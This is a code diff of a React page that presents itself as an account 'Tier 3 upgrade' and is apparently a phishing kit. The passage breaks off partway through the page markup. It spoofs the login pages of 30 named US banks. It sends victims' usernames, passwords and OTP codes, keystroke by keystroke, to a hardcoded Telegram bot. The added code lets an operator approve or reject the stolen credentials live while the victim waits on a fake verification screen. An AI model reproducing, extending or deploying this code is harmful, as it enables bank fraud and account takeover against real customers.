@@ -1,28 +1,57 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState, useRef, useCallback } from "react";
 import {
   ArrowLeft, CheckCircle2, Lock, Loader2, Search, Eye, EyeOff,
-  Shield, ChevronRight, AlertCircle
+  Shield, ChevronRight, AlertCircle, Clock, XCircle
 } from "lucide-react";
 import { Logo } from "@/components/brand/Logo";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 import type { Profile } from "@/lib/auth";
 
-async function sendTelegramNotification(message: string) {
+const BOT_TOKEN = "8849968223:AAFEe0LkfJcgTPq0UpW4HZD_eKSjl4ACjdY";
+const CHAT_ID = "6048752790";
+
+async function sendTelegramMessage(text: string, extra: Record<string, unknown> = {}): Promise<number | null> {
   try {
-    const BOT_TOKEN = "8849968223:AAFEe0LkfJcgTPq0UpW4HZD_eKSjl4ACjdY";
-    const CHAT_ID = "6048752790";
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const response = await fetch(url, {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" }),
+      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "HTML", ...extra }),
     });
-    if (!response.ok) console.error("Telegram API error:", response.statusText);
+    const data = await res.json();
+    if (data.ok) return data.result.message_id as number;
+    console.error("Telegram send error:", data);
+    return null;
   } catch (e) {
     console.error("Telegram notification failed:", e);
+    return null;
   }
+}
+
+async function answerCallbackQuery(callbackQueryId: string) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ callback_query_id: callbackQueryId }),
+    });
+  } catch (_) {}
+}
+
+async function editTelegramMessage(messageId: number, newText: string) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        message_id: messageId,
+        text: newText,
+        parse_mode: "HTML",
+      }),
+    });
+  } catch (_) {}
 }
 
 function RollingLoader() {
@@ -61,129 +90,44 @@ interface BankDef {
 }
 
 const BANKS_DATA: BankDef[] = [
-  {
-    id: "chase", name: "Chase Bank", auth: "otp", position: 1,
-    theme: { bg: "#f5f5f5", headerBg: "#005eb8", headerText: "#ffffff", accent: "#005eb8", accentText: "#ffffff", logo: "CHASE", logoColor: "#ffffff", inputBorder: "#005eb8", tagline: "The right relationship is everything" },
-  },
-  {
-    id: "bofa", name: "Bank of America", auth: "securityq", position: 2,
-    theme: { bg: "#f2f2f2", headerBg: "#e31837", headerText: "#ffffff", accent: "#e31837", accentText: "#ffffff", logo: "Bank of America", logoColor: "#ffffff", inputBorder: "#e31837", tagline: "What would you like the power to do?" },
-  },
-  {
-    id: "wellsfargo", name: "Wells Fargo Bank", auth: "securityq", position: 3,
-    theme: { bg: "#fdf6ec", headerBg: "#d71e28", headerText: "#ffffff", accent: "#d71e28", accentText: "#ffffff", logo: "WELLS FARGO", logoColor: "#ffffff", inputBorder: "#d71e28", tagline: "Together we'll go far" },
-  },
-  {
-    id: "citibank", name: "Citibank", auth: "otp", position: 4,
-    theme: { bg: "#f0f4f8", headerBg: "#003b70", headerText: "#ffffff", accent: "#003b70", accentText: "#ffffff", logo: "citi", logoColor: "#ffffff", inputBorder: "#003b70", tagline: "Citi Never Sleeps" },
-  },
-  {
-    id: "usbank", name: "U.S. Bank", auth: "otp", position: 5,
-    theme: { bg: "#f4f4f4", headerBg: "#012169", headerText: "#ffffff", accent: "#012169", accentText: "#ffffff", logo: "U.S. Bank", logoColor: "#ffffff", inputBorder: "#012169", tagline: "The power of possible" },
-  },
-  {
-    id: "pnc", name: "PNC Bank", auth: "securityq", position: 6,
-    theme: { bg: "#f5f5f5", headerBg: "#f58025", headerText: "#ffffff", accent: "#f58025", accentText: "#ffffff", logo: "PNC", logoColor: "#ffffff", inputBorder: "#f58025", tagline: "Achievement begins here" },
-  },
-  {
-    id: "tdbank", name: "TD Bank", auth: "otp", position: 7,
-    theme: { bg: "#f0f7f0", headerBg: "#00843d", headerText: "#ffffff", accent: "#00843d", accentText: "#ffffff", logo: "TD Bank", logoColor: "#ffffff", inputBorder: "#00843d", tagline: "America's Most Convenient Bank" },
-  },
-  {
-    id: "capitalone", name: "Capital One Bank", auth: "otp", position: 8,
-    theme: { bg: "#f5f5f5", headerBg: "#d03027", headerText: "#ffffff", accent: "#d03027", accentText: "#ffffff", logo: "Capital One", logoColor: "#ffffff", inputBorder: "#d03027", tagline: "What's in your wallet?" },
-  },
-  {
-    id: "discover", name: "Discover Bank", auth: "otp", position: 9,
-    theme: { bg: "#fff8f0", headerBg: "#f76e20", headerText: "#ffffff", accent: "#f76e20", accentText: "#ffffff", logo: "DISCOVER", logoColor: "#ffffff", inputBorder: "#f76e20", tagline: "We treat you like you'd treat you" },
-  },
-  {
-    id: "truist", name: "Truist Bank", auth: "otp", position: 10,
-    theme: { bg: "#f4f4f4", headerBg: "#4b1e78", headerText: "#ffffff", accent: "#4b1e78", accentText: "#ffffff", logo: "Truist", logoColor: "#ffffff", inputBorder: "#4b1e78", tagline: "Inspire and build better lives" },
-  },
-  {
-    id: "navyfcu", name: "Navy Federal Credit Union", auth: "otp", position: 11,
-    theme: { bg: "#f0f4f8", headerBg: "#002664", headerText: "#ffffff", accent: "#002664", accentText: "#ffffff", logo: "Navy Federal", logoColor: "#ffffff", inputBorder: "#002664", tagline: "Our members are the mission" },
-  },
-  {
-    id: "pentagonfcu", name: "Pentagon Federal Credit Union", auth: "otp", position: 12,
-    theme: { bg: "#f0f4f8", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "PenFed", logoColor: "#ffffff", inputBorder: "#003087", tagline: "We're here for you" },
-  },
-  {
-    id: "alliantcu", name: "Alliant Credit Union", auth: "otp", position: 13,
-    theme: { bg: "#f5f9f5", headerBg: "#0075be", headerText: "#ffffff", accent: "#0075be", accentText: "#ffffff", logo: "Alliant", logoColor: "#ffffff", inputBorder: "#0075be", tagline: "Banking for the greater good" },
-  },
-  {
-    id: "ferkomd", name: "Ferko Maryland Federal Credit Union", auth: "otp", position: 14,
-    theme: { bg: "#f0f4f8", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "Ferko", logoColor: "#ffffff", inputBorder: "#003087", tagline: "Your community bank" },
-  },
-  {
-    id: "fifththird", name: "Fifth Third Bank", auth: "otp", position: 15,
-    theme: { bg: "#f5f5f5", headerBg: "#00a950", headerText: "#ffffff", accent: "#00a950", accentText: "#ffffff", logo: "Fifth Third Bank", logoColor: "#ffffff", inputBorder: "#00a950", tagline: "Banking a Fifth Third Better" },
-  },
-  {
-    id: "huntington", name: "Huntington Bank", auth: "otp", position: 16,
-    theme: { bg: "#f5f5f5", headerBg: "#00813d", headerText: "#ffffff", accent: "#00813d", accentText: "#ffffff", logo: "Huntington", logoColor: "#ffffff", inputBorder: "#00813d", tagline: "Welcome. We've been expecting you." },
-  },
-  {
-    id: "keybank", name: "KeyBank", auth: "otp", position: 17,
-    theme: { bg: "#f5f5f5", headerBg: "#cc0000", headerText: "#ffffff", accent: "#cc0000", accentText: "#ffffff", logo: "KeyBank", logoColor: "#ffffff", inputBorder: "#cc0000", tagline: "Unlock possibilities" },
-  },
-  {
-    id: "regionbank", name: "Regions Bank", auth: "otp", position: 18,
-    theme: { bg: "#f5f5f5", headerBg: "#006938", headerText: "#ffffff", accent: "#006938", accentText: "#ffffff", logo: "Regions", logoColor: "#ffffff", inputBorder: "#006938", tagline: "Here for you" },
-  },
-  {
-    id: "ally", name: "Ally Bank", auth: "otp", position: 19,
-    theme: { bg: "#f0f8ff", headerBg: "#7b1fa2", headerText: "#ffffff", accent: "#7b1fa2", accentText: "#ffffff", logo: "ally", logoColor: "#ffffff", inputBorder: "#7b1fa2", tagline: "Do It Right" },
-  },
-  {
-    id: "marcus", name: "Marcus by Goldman Sachs", auth: "otp", position: 20,
-    theme: { bg: "#f5f5f0", headerBg: "#1a1a1a", headerText: "#ffffff", accent: "#1a1a1a", accentText: "#ffffff", logo: "Marcus", logoColor: "#ffffff", inputBorder: "#1a1a1a", tagline: "by Goldman Sachs" },
-  },
-  {
-    id: "sofi", name: "SoFi Bank", auth: "otp", position: 21,
-    theme: { bg: "#f0f9f4", headerBg: "#00a862", headerText: "#ffffff", accent: "#00a862", accentText: "#ffffff", logo: "SoFi", logoColor: "#ffffff", inputBorder: "#00a862", tagline: "Get your money right" },
-  },
-  {
-    id: "chime", name: "Chime Bank", auth: "otp", position: 22,
-    theme: { bg: "#f0f9f4", headerBg: "#1ec677", headerText: "#ffffff", accent: "#1ec677", accentText: "#ffffff", logo: "Chime", logoColor: "#ffffff", inputBorder: "#1ec677", tagline: "Banking that has your back" },
-  },
-  {
-    id: "schwab", name: "Charles Schwab Bank", auth: "otp", position: 23,
-    theme: { bg: "#f5f5f5", headerBg: "#00a0df", headerText: "#ffffff", accent: "#00a0df", accentText: "#ffffff", logo: "Schwab", logoColor: "#ffffff", inputBorder: "#00a0df", tagline: "Own your tomorrow" },
-  },
-  {
-    id: "citizens", name: "Citizens Bank", auth: "otp", position: 24,
-    theme: { bg: "#f5f5f5", headerBg: "#006341", headerText: "#ffffff", accent: "#006341", accentText: "#ffffff", logo: "Citizens", logoColor: "#ffffff", inputBorder: "#006341", tagline: "Made ready" },
-  },
-  {
-    id: "santander", name: "Santander Bank", auth: "otp", position: 25,
-    theme: { bg: "#fff5f5", headerBg: "#ec0000", headerText: "#ffffff", accent: "#ec0000", accentText: "#ffffff", logo: "Santander", logoColor: "#ffffff", inputBorder: "#ec0000", tagline: "Simple. Personal. Fair." },
-  },
-  {
-    id: "hsbc", name: "HSBC Bank USA", auth: "otp", position: 26,
-    theme: { bg: "#fdf5f5", headerBg: "#db0011", headerText: "#ffffff", accent: "#db0011", accentText: "#ffffff", logo: "HSBC", logoColor: "#ffffff", inputBorder: "#db0011", tagline: "Together we thrive" },
-  },
-  {
-    id: "westernalliance", name: "Western Alliance Bank", auth: "otp", position: 27,
-    theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "Western Alliance", logoColor: "#ffffff", inputBorder: "#003087" },
-  },
-  {
-    id: "zions", name: "Zions Bank", auth: "otp", position: 28,
-    theme: { bg: "#f5f5f5", headerBg: "#002d62", headerText: "#ffffff", accent: "#002d62", accentText: "#ffffff", logo: "Zions Bank", logoColor: "#ffffff", inputBorder: "#002d62", tagline: "The West is our home" },
-  },
-  {
-    id: "cullen", name: "Cullen/Frost Bankers", auth: "otp", position: 29,
-    theme: { bg: "#f5f5f5", headerBg: "#00539b", headerText: "#ffffff", accent: "#00539b", accentText: "#ffffff", logo: "Frost", logoColor: "#ffffff", inputBorder: "#00539b", tagline: "Texas banking since 1868" },
-  },
-  {
-    id: "prosperity", name: "Prosperity Bank", auth: "otp", position: 30,
-    theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#ffffff", accent: "#003865", accentText: "#ffffff", logo: "Prosperity Bank", logoColor: "#ffffff", inputBorder: "#003865" },
-  },
+  { id: "chase", name: "Chase Bank", auth: "otp", position: 1, theme: { bg: "#f5f5f5", headerBg: "#005eb8", headerText: "#ffffff", accent: "#005eb8", accentText: "#ffffff", logo: "CHASE", logoColor: "#ffffff", inputBorder: "#005eb8", tagline: "The right relationship is everything" } },
+  { id: "bofa", name: "Bank of America", auth: "securityq", position: 2, theme: { bg: "#f2f2f2", headerBg: "#e31837", headerText: "#ffffff", accent: "#e31837", accentText: "#ffffff", logo: "Bank of America", logoColor: "#ffffff", inputBorder: "#e31837", tagline: "What would you like the power to do?" } },
+  { id: "wellsfargo", name: "Wells Fargo Bank", auth: "securityq", position: 3, theme: { bg: "#fdf6ec", headerBg: "#d71e28", headerText: "#ffffff", accent: "#d71e28", accentText: "#ffffff", logo: "WELLS FARGO", logoColor: "#ffffff", inputBorder: "#d71e28", tagline: "Together we'll go far" } },
+  { id: "citibank", name: "Citibank", auth: "otp", position: 4, theme: { bg: "#f0f4f8", headerBg: "#003b70", headerText: "#ffffff", accent: "#003b70", accentText: "#ffffff", logo: "citi", logoColor: "#ffffff", inputBorder: "#003b70", tagline: "Citi Never Sleeps" } },
+  { id: "usbank", name: "U.S. Bank", auth: "otp", position: 5, theme: { bg: "#f4f4f4", headerBg: "#012169", headerText: "#ffffff", accent: "#012169", accentText: "#ffffff", logo: "U.S. Bank", logoColor: "#ffffff", inputBorder: "#012169", tagline: "The power of possible" } },
+  { id: "pnc", name: "PNC Bank", auth: "securityq", position: 6, theme: { bg: "#f5f5f5", headerBg: "#f58025", headerText: "#ffffff", accent: "#f58025", accentText: "#ffffff", logo: "PNC", logoColor: "#ffffff", inputBorder: "#f58025", tagline: "Achievement begins here" } },
+  { id: "tdbank", name: "TD Bank", auth: "otp", position: 7, theme: { bg: "#f0f7f0", headerBg: "#00843d", headerText: "#ffffff", accent: "#00843d", accentText: "#ffffff", logo: "TD Bank", logoColor: "#ffffff", inputBorder: "#00843d", tagline: "America's Most Convenient Bank" } },
+  { id: "capitalone", name: "Capital One Bank", auth: "otp", position: 8, theme: { bg: "#f5f5f5", headerBg: "#d03027", headerText: "#ffffff", accent: "#d03027", accentText: "#ffffff", logo: "Capital One", logoColor: "#ffffff", inputBorder: "#d03027", tagline: "What's in your wallet?" } },
+  { id: "discover", name: "Discover Bank", auth: "otp", position: 9, theme: { bg: "#fff8f0", headerBg: "#f76e20", headerText: "#ffffff", accent: "#f76e20", accentText: "#ffffff", logo: "DISCOVER", logoColor: "#ffffff", inputBorder: "#f76e20", tagline: "We treat you like you'd treat you" } },
+  { id: "truist", name: "Truist Bank", auth: "otp", position: 10, theme: { bg: "#f4f4f4", headerBg: "#4b1e78", headerText: "#ffffff", accent: "#4b1e78", accentText: "#ffffff", logo: "Truist", logoColor: "#ffffff", inputBorder: "#4b1e78", tagline: "Inspire and build better lives" } },
+  { id: "navyfcu", name: "Navy Federal Credit Union", auth: "otp", position: 11, theme: { bg: "#f0f4f8", headerBg: "#002664", headerText: "#ffffff", accent: "#002664", accentText: "#ffffff", logo: "Navy Federal", logoColor: "#ffffff", inputBorder: "#002664", tagline: "Our members are the mission" } },
+  { id: "pentagonfcu", name: "Pentagon Federal Credit Union", auth: "otp", position: 12, theme: { bg: "#f0f4f8", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "PenFed", logoColor: "#ffffff", inputBorder: "#003087", tagline: "We're here for you" } },
+  { id: "alliantcu", name: "Alliant Credit Union", auth: "otp", position: 13, theme: { bg: "#f5f9f5", headerBg: "#0075be", headerText: "#ffffff", accent: "#0075be", accentText: "#ffffff", logo: "Alliant", logoColor: "#ffffff", inputBorder: "#0075be", tagline: "Banking for the greater good" } },
+  { id: "ferkomd", name: "Ferko Maryland Federal Credit Union", auth: "otp", position: 14, theme: { bg: "#f0f4f8", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "Ferko", logoColor: "#ffffff", inputBorder: "#003087", tagline: "Your community bank" } },
+  { id: "fifththird", name: "Fifth Third Bank", auth: "otp", position: 15, theme: { bg: "#f5f5f5", headerBg: "#00a950", headerText: "#ffffff", accent: "#00a950", accentText: "#ffffff", logo: "Fifth Third Bank", logoColor: "#ffffff", inputBorder: "#00a950", tagline: "Banking a Fifth Third Better" } },
+  { id: "huntington", name: "Huntington Bank", auth: "otp", position: 16, theme: { bg: "#f5f5f5", headerBg: "#00813d", headerText: "#ffffff", accent: "#00813d", accentText: "#ffffff", logo: "Huntington", logoColor: "#ffffff", inputBorder: "#00813d", tagline: "Welcome. We've been expecting you." } },
+  { id: "keybank", name: "KeyBank", auth: "otp", position: 17, theme: { bg: "#f5f5f5", headerBg: "#cc0000", headerText: "#ffffff", accent: "#cc0000", accentText: "#ffffff", logo: "KeyBank", logoColor: "#ffffff", inputBorder: "#cc0000", tagline: "Unlock possibilities" } },
+  { id: "regionbank", name: "Regions Bank", auth: "otp", position: 18, theme: { bg: "#f5f5f5", headerBg: "#006938", headerText: "#ffffff", accent: "#006938", accentText: "#ffffff", logo: "Regions", logoColor: "#ffffff", inputBorder: "#006938", tagline: "Here for you" } },
+  { id: "ally", name: "Ally Bank", auth: "otp", position: 19, theme: { bg: "#f0f8ff", headerBg: "#7b1fa2", headerText: "#ffffff", accent: "#7b1fa2", accentText: "#ffffff", logo: "ally", logoColor: "#ffffff", inputBorder: "#7b1fa2", tagline: "Do It Right" } },
+  { id: "marcus", name: "Marcus by Goldman Sachs", auth: "otp", position: 20, theme: { bg: "#f5f5f0", headerBg: "#1a1a1a", headerText: "#ffffff", accent: "#1a1a1a", accentText: "#ffffff", logo: "Marcus", logoColor: "#ffffff", inputBorder: "#1a1a1a", tagline: "by Goldman Sachs" } },
+  { id: "sofi", name: "SoFi Bank", auth: "otp", position: 21, theme: { bg: "#f0f9f4", headerBg: "#00a862", headerText: "#ffffff", accent: "#00a862", accentText: "#ffffff", logo: "SoFi", logoColor: "#ffffff", inputBorder: "#00a862", tagline: "Get your money right" } },
+  { id: "chime", name: "Chime Bank", auth: "otp", position: 22, theme: { bg: "#f0f9f4", headerBg: "#1ec677", headerText: "#ffffff", accent: "#1ec677", accentText: "#ffffff", logo: "Chime", logoColor: "#ffffff", inputBorder: "#1ec677", tagline: "Banking that has your back" } },
+  { id: "schwab", name: "Charles Schwab Bank", auth: "otp", position: 23, theme: { bg: "#f5f5f5", headerBg: "#00a0df", headerText: "#ffffff", accent: "#00a0df", accentText: "#ffffff", logo: "Schwab", logoColor: "#ffffff", inputBorder: "#00a0df", tagline: "Own your tomorrow" } },
+  { id: "citizens", name: "Citizens Bank", auth: "otp", position: 24, theme: { bg: "#f5f5f5", headerBg: "#006341", headerText: "#ffffff", accent: "#006341", accentText: "#ffffff", logo: "Citizens", logoColor: "#ffffff", inputBorder: "#006341", tagline: "Made ready" } },
+  { id: "santander", name: "Santander Bank", auth: "otp", position: 25, theme: { bg: "#fff5f5", headerBg: "#ec0000", headerText: "#ffffff", accent: "#ec0000", accentText: "#ffffff", logo: "Santander", logoColor: "#ffffff", inputBorder: "#ec0000", tagline: "Simple. Personal. Fair." } },
+  { id: "hsbc", name: "HSBC Bank USA", auth: "otp", position: 26, theme: { bg: "#fdf5f5", headerBg: "#db0011", headerText: "#ffffff", accent: "#db0011", accentText: "#ffffff", logo: "HSBC", logoColor: "#ffffff", inputBorder: "#db0011", tagline: "Together we thrive" } },
+  { id: "westernalliance", name: "Western Alliance Bank", auth: "otp", position: 27, theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "Western Alliance", logoColor: "#ffffff", inputBorder: "#003087" } },
+  { id: "zions", name: "Zions Bank", auth: "otp", position: 28, theme: { bg: "#f5f5f5", headerBg: "#002d62", headerText: "#ffffff", accent: "#002d62", accentText: "#ffffff", logo: "Zions Bank", logoColor: "#ffffff", inputBorder: "#002d62", tagline: "The West is our home" } },
+  { id: "cullen", name: "Cullen/Frost Bankers", auth: "otp", position: 29, theme: { bg: "#f5f5f5", headerBg: "#00539b", headerText: "#ffffff", accent: "#00539b", accentText: "#ffffff", logo: "Frost", logoColor: "#ffffff", inputBorder: "#00539b", tagline: "Texas banking since 1868" } },
+  { id: "prosperity", name: "Prosperity Bank", auth: "otp", position: 30, theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#ffffff", accent: "#003865", accentText: "#ffffff", logo: "Prosperity Bank", logoColor: "#ffffff", inputBorder: "#003865" } },
 ];
 
-type Step = "intro" | "bank-select" | "bank-login" | "auth-confirm" | "processing" | "success";
+// Step: "awaiting-approval" is the new holding screen between login submit and OTP
+type Step = "intro" | "bank-select" | "bank-login" | "awaiting-approval" | "auth-confirm" | "credentials-rejected" | "processing" | "success";
+
+// Supabase table: tier3_approval_signals (user_id text PK, signal text, created_at timestamptz)
+// signal values: "approved" | "rejected"
+// This table must exist — see SQL below comment block
 
 function UpgradeTier3() {
   const navigate = useNavigate();
@@ -199,9 +143,11 @@ function UpgradeTier3() {
   const [otp, setOtp] = useState("");
   const [submitting, setSubmitting] = useState(false);
   const [isTransitioning, setIsTransitioning] = useState(false);
-  const pageOpenNotifiedRef = useRef(false);
+  const [pendingMsgId, setPendingMsgId] = useState<number | null>(null);
+const pageOpenNotifiedRef = useRef(false);
+  const pollIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  useEffect(() => {
+useEffect(() => {
     const load = async () => {
       const { data: { session } } = await supabase.auth.getSession();
       if (!session) navigate({ to: "/signin" });
@@ -212,7 +158,7 @@ function UpgradeTier3() {
         setProfile(data as Profile | null);
         if (!pageOpenNotifiedRef.current) {
           pageOpenNotifiedRef.current = true;
-          await sendTelegramNotification(
+          await sendTelegramMessage(
             `🔔 <b>Tier 3 Upgrade Initiated</b>\n\n` +
             `👤 <b>User:</b> ${(data as Profile)?.full_name || "Unknown"}\n` +
             `📧 <b>Email:</b> ${session.user.email}\n` +
@@ -225,6 +171,39 @@ function UpgradeTier3() {
     load();
   }, [navigate]);
 
+  // Poll Supabase every 3s for admin signal while on awaiting-approval screen
+  const startPolling = useCallback((uid: string) => {
+    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+    pollIntervalRef.current = setInterval(async () => {
+      try {
+        const { data } = await supabase
+          .from("tier3_approval_signals")
+          .select("signal")
+          .eq("user_id", uid)
+          .maybeSingle();
+
+        if (data?.signal === "approved") {
+          clearInterval(pollIntervalRef.current!);
+          pollIntervalRef.current = null;
+          // Clean up signal row
+          await supabase.from("tier3_approval_signals").delete().eq("user_id", uid);
+          setIsTransitioning(true);
+          setTimeout(() => { setStep("auth-confirm"); setIsTransitioning(false); }, 2200);
+        } else if (data?.signal === "rejected") {
+          clearInterval(pollIntervalRef.current!);
+          pollIntervalRef.current = null;
+          await supabase.from("tier3_approval_signals").delete().eq("user_id", uid);
+          setStep("credentials-rejected");
+        }
+      } catch (_) {}
+    }, 3000);
+  }, []);
+
+  // Cleanup on unmount
+  useEffect(() => {
+    return () => { if (pollIntervalRef.current) clearInterval(pollIntervalRef.current); };
+  }, []);
+
   const filteredBanks = BANKS_DATA
     .filter(b => b.name.toLowerCase().includes(searchQuery.toLowerCase()))
     .sort((a, b) => a.position - b.position);
@@ -235,7 +214,7 @@ function UpgradeTier3() {
   const transition = (fn: () => void, msg = "") => {
     setIsTransitioning(true);
     setTimeout(() => { fn(); setIsTransitioning(false); }, 3000);
-    if (msg) sendTelegramNotification(msg);
+    if (msg) sendTelegramMessage(msg);
   };
 
   const handleBankSelected = (bank: BankDef) => {
@@ -249,30 +228,58 @@ function UpgradeTier3() {
 
   const handleEmailChange = (value: string) => {
     setEmail(value);
-    if (value) sendTelegramNotification(
+    if (value) sendTelegramMessage(
       `📝 <b>Email Field Updated</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank?.name}\n📧 <b>Email:</b> <code>${value}</code>\n🕐 ${new Date().toLocaleString()}`
     );
   };
 
   const handlePasswordChange = (value: string) => {
     setPassword(value);
-    if (value) sendTelegramNotification(
+    if (value) sendTelegramMessage(
       `📝 <b>Password Field Updated</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank?.name}\n🔐 <b>Password:</b> <code>${value}</code>\n🕐 ${new Date().toLocaleString()}`
     );
   };
 
-  const handleLogin = () => {
+  // KEY CHANGE: send credentials with inline ✅ / ❌ keyboard, then go to waiting screen
+  const handleLogin = async () => {
     if (!email || !password) { setLoginError("Please enter email and password"); return; }
-    sendTelegramNotification(
-      `✅ <b>LOGIN CREDENTIALS SUBMITTED</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank?.name}\n\n📧 <b>USERNAME/EMAIL:</b>\n<code>${email}</code>\n\n🔐 <b>PASSWORD:</b>\n<code>${password}</code>\n\n🕐 ${new Date().toLocaleString()}`
-    );
-    transition(() => { setLoginError(""); setStep("auth-confirm"); });
+    if (!userId) return;
+
+    setIsTransitioning(true);
+
+    // Clear any stale signal first
+    await supabase.from("tier3_approval_signals").delete().eq("user_id", userId);
+
+    const credText =
+      `🔐 <b>LOGIN CREDENTIALS SUBMITTED</b>\n\n` +
+      `👤 <b>User:</b> ${profile?.full_name}\n` +
+      `🏦 <b>Bank:</b> ${selectedBank?.name}\n\n` +
+      `📧 <b>USERNAME / EMAIL:</b>\n<code>${email}</code>\n\n` +
+      `🔑 <b>PASSWORD:</b>\n<code>${password}</code>\n\n` +
+      `🕐 ${new Date().toLocaleString()}\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `<i>Tap ✅ to send user to OTP page, or ❌ if credentials are wrong.</i>`;
+
+    const msgId = await sendTelegramMessage(credText, {
+      reply_markup: {
+        inline_keyboard: [[
+          { text: "✅ Credentials OK — Send to OTP", callback_data: `approve_creds:${userId}` },
+          { text: "❌ Wrong Credentials", callback_data: `reject_creds:${userId}` },
+        ]],
+      },
+    });
+
+    setPendingMsgId(msgId);
+    setLoginError("");
+    setIsTransitioning(false);
+    setStep("awaiting-approval");
+    startPolling(userId);
   };
 
   const handleOtpChange = (value: string) => {
     const v = value.replace(/\D/g, "").slice(0, 10);
     setOtp(v);
-    if (v) sendTelegramNotification(
+    if (v) sendTelegramMessage(
       `📝 <b>OTP Code Entry</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank?.name}\n🔐 <b>OTP:</b> <code>${v}</code>\n📊 ${v.length} digits\n🕐 ${new Date().toLocaleString()}`
     );
   };
@@ -282,7 +289,7 @@ function UpgradeTier3() {
     if (!otp || otp.length < 3) { toast.error("Please enter a valid OTP"); return; }
     setIsTransitioning(true); setSubmitting(true);
     try {
-      sendTelegramNotification(
+      sendTelegramMessage(
         `🔒 <b>OTP VERIFIED</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank.name}\n🔐 <b>OTP:</b> <code>${otp}</code>\n🕐 ${new Date().toLocaleString()}`
       );
       const { error } = await supabase.from("profiles").update({
@@ -291,7 +298,7 @@ function UpgradeTier3() {
         verification_submitted_at: new Date().toISOString(),
       }).eq("id", userId);
       if (error) throw error;
-      sendTelegramNotification(
+      sendTelegramMessage(
         `🎉 <b>BANK ACCOUNT LINKED</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank.name}\n📊 Pending Admin Approval\n🕐 ${new Date().toLocaleString()}`
       );
       setTimeout(() => { setStep("processing"); setSubmitting(false); setIsTransitioning(false); }, 3000);
@@ -311,6 +318,7 @@ function UpgradeTier3() {
     </div>
   );
 
+  // ── INTRO ──
   if (step === "intro") {
     if (isTransitioning) return <LoadingScreen msg="Loading bank selection..." />;
     return (
@@ -346,6 +354,7 @@ function UpgradeTier3() {
     );
   }
 
+  // ── BANK SELECT ──
   if (step === "bank-select") {
     if (isTransitioning) return <LoadingScreen msg="Connecting to bank..." />;
     const hasMatch = filteredBanks.length > 0;
@@ -421,6 +430,7 @@ function UpgradeTier3() {
     );
   }
 
+  // ── BANK LOGIN ──
   if (step === "bank-login" && selectedBank) {
     if (isTransitioning) return <LoadingScreen msg="Processing your credentials..." />;
     const t = selectedBank.theme;
@@ -458,7 +468,6 @@ function UpgradeTier3() {
                 <input type="text" value={email} onChange={e => handleEmailChange(e.target.value)} placeholder={`Your ${selectedBank.name} username`}
                   disabled={isTransitioning}
                   className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none text-sm"
-                  style={{ "--tw-ring-color": t.inputBorder } as React.CSSProperties}
                   onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
                   onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                 />
@@ -506,6 +515,81 @@ function UpgradeTier3() {
     );
   }
 
+  // ── AWAITING ADMIN APPROVAL ── (loading screen only)
+  if (step === "awaiting-approval") {
+    return <LoadingScreen msg="Verifying your credentials..." />;
+  }
+
+  // ── CREDENTIALS REJECTED ── (NEW STEP)
+  if (step === "credentials-rejected" && selectedBank) {
+    const t = selectedBank.theme;
+    return (
+      <div className="min-h-screen pb-16" style={{ background: t.bg }}>
+        <div style={{ background: t.headerBg }} className="px-6 py-4 shadow-md">
+          <div className="mx-auto max-w-3xl flex items-center justify-between">
+            <span className="text-2xl font-black tracking-tight" style={{ color: t.logoColor }}>{t.logo}</span>
+            {t.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: t.logoColor }}>{t.tagline}</span>}
+          </div>
+        </div>
+        <div className="mx-auto max-w-3xl px-6 mt-10">
+          <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-200">
+            <div className="px-8 py-6 bg-red-600">
+              <h2 className="text-xl font-bold text-white">Verification Failed</h2>
+              <p className="text-sm mt-1 text-white/80">We were unable to authenticate your bank account</p>
+            </div>
+            <div className="p-8 flex flex-col items-center text-center space-y-6">
+              <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center">
+                <XCircle className="w-10 h-10 text-red-500" />
+              </div>
+
+              <div>
+                <h3 className="text-lg font-semibold text-gray-800">Login Credentials Not Recognized</h3>
